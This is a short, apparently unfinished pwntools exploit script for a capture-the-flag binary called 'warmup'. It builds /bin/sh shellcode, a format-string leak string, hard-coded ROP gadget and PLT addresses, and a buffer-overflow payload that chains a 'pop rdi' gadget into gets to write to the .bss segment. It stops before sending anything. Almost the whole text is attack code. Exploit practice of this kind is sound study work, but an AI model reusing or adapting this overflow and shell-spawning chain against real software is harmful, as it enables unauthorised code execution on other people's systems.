from pwn import *
context.arch = "amd64"
shellcode = asm(shellcraft.sh())
p = process('./warmup')

fmt = b"%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p "

var_offset = 0x100
var_offset_with_rbp = 0x100 + 0x8
bss_segment = 0x00601060
printf_call = 0x00400570
gets_call = 0x00400580
pop_rdi = 0x0000000000400773
pop_rsi = 0x0000000000400771
ret = 0x000000000040053e

fmt_str_payload = fmtstr_payload(6, { bss_segment: shellcode })

payload = b'A' * var_offset_with_rbp + p64(pop_rdi) + p64(bss_segment)

payload += p64(gets_call)

shellcode_payload = shellcode


